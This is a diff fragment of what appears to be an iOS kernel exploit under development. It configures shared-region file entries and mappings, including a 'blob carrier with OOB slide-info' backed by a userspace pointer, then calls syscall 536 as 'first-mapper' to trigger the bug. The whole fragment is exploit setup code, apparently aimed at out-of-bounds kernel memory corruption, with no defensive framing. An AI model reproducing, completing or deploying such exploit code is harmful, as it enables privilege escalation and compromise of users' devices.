@@ -495,45 +495,60 @@ typedef struct {
                 rc, *(uint64_t*)(hb+0x28), fs.fs_blob_size]];
         }
 
-        // Fallback: fd=-1 (in-memory)
+        // ── Build file entries ──
+        // file[0]: opened cache fd for TEXT header and DX carrier data
         c->files[0].sf_fd = fd_main;
-        c->files[0].sf_mappings_count = 1;
+        c->files[0].sf_mappings_count = (fd_main >= 0) ? 2 : 0;  // mapping[0] + mapping[2]
         c->files[0].sf_slide = 0;
+
+        // file[1]: in-memory blob carrier (fd=-1, kernel reads from userspace)
+        c->files[1].sf_fd = -1;
+        c->files[1].sf_mappings_count = 1;  // mapping[1]
+        c->files[1].sf_slide = 0;
+
+        // file[2]: unused
+        c->files[2].sf_fd = -1;
+        c->files[2].sf_mappings_count = 0;
+        c->files[2].sf_slide = 0;
+
+        int totalMappings = c->files[0].sf_mappings_count
+                          + c->files[1].sf_mappings_count
+                          + c->files[2].sf_mappings_count;
 
         if (fd_main < 0) {
             [self log:@"cache fd not found, using fd=-1 (in-memory)"];
         }
 
-        // mappings[0]: TEXT header
+        // mappings[0]: TEXT header (uses file[0])
         c->mappings[0].sms_address     = 0x180000000ULL;
         c->mappings[0].sms_size         = HDR_SZ;
         c->mappings[0].sms_file_offset  = 0;
         c->mappings[0].sms_max_prot     = 5;
         c->mappings[0].sms_init_prot     = 1;
 
-        // mappings[1]: blob carrier
+        // mappings[1]: blob carrier with OOB slide-info (uses file[1], fd=-1, in-memory)
         c->mappings[1].sms_address     = BLOB_VA;
         c->mappings[1].sms_size         = 0x4000;
-        c->mappings[1].sms_file_offset  = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000);
+        c->mappings[1].sms_file_offset  = (uint64_t)(uintptr_t)blob;  // userspace ptr for fd=-1
         c->mappings[1].sms_slide_size   = blobSz;
-        c->mappings[1].sms_slide_start  = (uint64_t)(uintptr_t)((uint8_t*)cfg + 0x4000);
+        c->mappings[1].sms_slide_start  = (uint64_t)(uintptr_t)blob;
         c->mappings[1].sms_max_prot     = 5;
         c->mappings[1].sms_init_prot     = 3;
 
-        // mappings[2]: non-auth DX carrier
+        // mappings[2]: non-auth DX carrier (uses file[0])
         c->mappings[2].sms_address     = naAddr;
         c->mappings[2].sms_size         = naSize;
         c->mappings[2].sms_file_offset  = naFoff;
         c->mappings[2].sms_max_prot     = naMax;
         c->mappings[2].sms_init_prot     = naInit;
 
-        [self log:[NSString stringWithFormat:@"cfg: 3 files, 3 mappings, fault=0x%llx blob@0x%llx",
-            naAddr, BLOB_VA]];
+        [self log:[NSString stringWithFormat:@"cfg: %d files, %d mappings, fd_main=%d, fault=0x%llx blob@0x%llx",
+            (fd_main >= 0 ? 2 : 1), totalMappings, fd_main, naAddr, BLOB_VA]];
 
         // ── Call syscall 536 — first-mapper ──
         [self log:@"\n!! CALLING syscall(536) as first-mapper... !!"];
         errno = 0;
-        long r536 = sc(536, 3, c->files, 3, c->mappings);
+        long r536 = sc(536, 3, c->files, totalMappings, c->mappings);
         [self log:[NSString stringWithFormat:@"syscall(536,...): ret=%ld errno=%d", r536, errno]];
 
         if (r536 == 0) {
